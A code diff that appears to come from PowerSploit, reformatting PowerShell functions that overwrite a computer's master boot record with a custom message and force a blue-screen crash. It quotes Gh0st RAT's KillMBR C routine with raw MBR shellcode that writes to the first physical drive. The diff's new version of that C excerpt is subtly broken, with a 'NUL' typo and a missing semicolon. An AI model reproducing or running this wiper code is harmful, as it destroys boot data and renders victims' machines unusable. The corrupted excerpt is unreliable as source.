@@ -3,109 +3,109 @@ function Set-MasterBootRecord
 <#
 .SYNOPSIS
 
-    Proof of concept code that overwrites the master boot record with the
-    message of your choice.
+Proof of concept code that overwrites the master boot record with the
+message of your choice.
 
-    PowerSploit Function: Set-MasterBootRecord
-    Author: Matthew Graeber (@mattifestation) and Chris Campbell (@obscuresec)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
- 
+PowerSploit Function: Set-MasterBootRecord  
+Author: Matthew Graeber (@mattifestation) and Chris Campbell (@obscuresec)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
+
 .DESCRIPTION
 
-    Set-MasterBootRecord is proof of concept code designed to show that it is
-    possible with PowerShell to overwrite the MBR. This technique was taken
-    from a public malware sample. This script is inteded solely as proof of
-    concept code.
+Set-MasterBootRecord is proof of concept code designed to show that it is
+possible with PowerShell to overwrite the MBR. This technique was taken
+from a public malware sample. This script is inteded solely as proof of
+concept code.
 
 .PARAMETER BootMessage
 
-    Specifies the message that will be displayed upon making your computer a brick.
+Specifies the message that will be displayed upon making your computer a brick.
 
 .PARAMETER RebootImmediately
 
-    Reboot the machine immediately upon overwriting the MBR.
+Reboot the machine immediately upon overwriting the MBR.
 
 .PARAMETER Force
 
-    Suppress the warning prompt.
+Suppress the warning prompt.
 
 .EXAMPLE
 
-    Set-MasterBootRecord -BootMessage 'This is what happens when you fail to defend your network. #CCDC'
+Set-MasterBootRecord -BootMessage 'This is what happens when you fail to defend your network. #CCDC'
 
 .NOTES
 
-    Obviously, this will only work if you have a master boot record to
-    overwrite. This won't work if you have a GPT (GUID partition table)
-#>
+Obviously, this will only work if you have a master boot record to
+overwrite. This won't work if you have a GPT (GUID partition table).
 
-<#
 This code was inspired by the Gh0st RAT source code seen here (acquired from: http://webcache.googleusercontent.com/search?q=cache:60uUuXfQF6oJ:read.pudn.com/downloads116/sourcecode/hack/trojan/494574/gh0st3.6_%25E6%25BA%2590%25E4%25BB%25A3%25E7%25A0%2581/gh0st/gh0st.cpp__.htm+&cd=3&hl=en&ct=clnk&gl=us):
 
-// CGh0stApp message handlers 
- 
-unsigned char scode[] = 
-"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c" 
-"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72" 
-"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29"; 
- 
-int CGh0stApp::KillMBR() 
-{ 
-	HANDLE hDevice; 
-	DWORD dwBytesWritten, dwBytesReturned; 
-	BYTE pMBR[512] = {0}; 
-	 
-	// ????MBR 
-	memcpy(pMBR, scode, sizeof(scode) - 1); 
-	pMBR[510] = 0x55; 
-	pMBR[511] = 0xAA; 
-	 
-	hDevice = CreateFile 
-		( 
-		"\\\\.\\PHYSICALDRIVE0", 
-		GENERIC_READ | GENERIC_WRITE, 
-		FILE_SHARE_READ | FILE_SHARE_WRITE, 
-		NULL, 
-		OPEN_EXISTING, 
-		0, 
-		NULL 
-		); 
-	if (hDevice == INVALID_HANDLE_VALUE) 
-		return -1; 
-	DeviceIoControl 
-		( 
-		hDevice,  
-		FSCTL_LOCK_VOLUME,  
-		NULL,  
-		0,  
-		NULL,  
-		0,  
-		&dwBytesReturned,  
-		NULL 
-		); 
-	// ?????? 
-	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL); 
-	DeviceIoControl 
-		( 
-		hDevice,  
-		FSCTL_UNLOCK_VOLUME,  
-		NULL,  
-		0,  
-		NULL,  
-		0,  
-		&dwBytesReturned,  
-		NULL 
-		); 
-	CloseHandle(hDevice); 
- 
-	ExitProcess(-1); 
-	return 0; 
-} 
+// CGh0stApp message handlers
+
+unsigned char scode[] =
+"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
+"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
+"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
+
+int CGh0stApp::KillMBR()
+{
+	HANDLE hDevice;
+	DWORD dwBytesWritten, dwBytesReturned;
+	BYTE pMBR[512] = {0};
+
+	// ????MBR
+	memcpy(pMBR, scode, sizeof(scode) - 1);
+	pMBR[510] = 0x55;
+	pMBR[511] = 0xAA;
+
+	hDevice = CreateFile
+		(
+		"\\\\.\\PHYSICALDRIVE0",
+		GENERIC_READ | GENERIC_WRITE,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		0,
+		NULL
+		);
+	if (hDevice == INVALID_HANDLE_VALUE)
+		return -1;
+	DeviceIoControl
+		(
+		hDevice,
+		FSCTL_LOCK_VOLUME,
+		NULL,
+		0,
+		NULL,
+		0,
+		&dwBytesReturned,
+		NUL
+		)
+	// ??????
+	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
+	DeviceIoControl
+		(
+		hDevice,
+		FSCTL_UNLOCK_VOLUME,
+		NULL,
+		0,
+		NULL,
+		0,
+		&dwBytesReturned,
+		NULL
+		);
+	CloseHandle(hDevice);
+
+	ExitProcess(-1);
+	return 0;
+}
 #>
 
-    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')] Param (
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
+    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
+    Param (
         [ValidateLength(1, 479)]
         [String]
         $BootMessage = 'Stop-Crying; Get-NewHardDrive',
@@ -220,7 +220,7 @@ int CGh0stApp::KillMBR()
     $MBRBytes = [Runtime.InteropServices.Marshal]::AllocHGlobal($MBRSize)
 
     # Zero-initialize the allocated unmanaged memory
-    0..511 | % { [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, $_), 0) }
+    0..511 | ForEach-Object { [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, $_), 0) }
 
     [Runtime.InteropServices.Marshal]::Copy($MBRInfectionCode, 0, $MBRBytes, $MBRInfectionCode.Length)
 
@@ -272,11 +272,11 @@ function Set-CriticalProcess
 
 Causes your machine to blue screen upon exiting PowerShell.
 
-PowerSploit Function: Set-CriticalProcess
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
+PowerSploit Function: Set-CriticalProcess  
+Author: Matthew Graeber (@mattifestation)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
 
 .PARAMETER ExitImmediately
 
@@ -300,7 +300,9 @@ Set-CriticalProcess -Force -Verbose
 
 #>
 
-    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')] Param (
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
+    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
+    Param (
         [Switch]
         $Force,
 
@@ -319,7 +321,7 @@ Set-CriticalProcess -Force -Verbose
     {
         $Response = $psCmdlet.ShouldContinue('Have you saved all your work?', 'The machine will blue screen when you exit PowerShell.')
     }
-    
+
     if (!$Response)
     {
         return
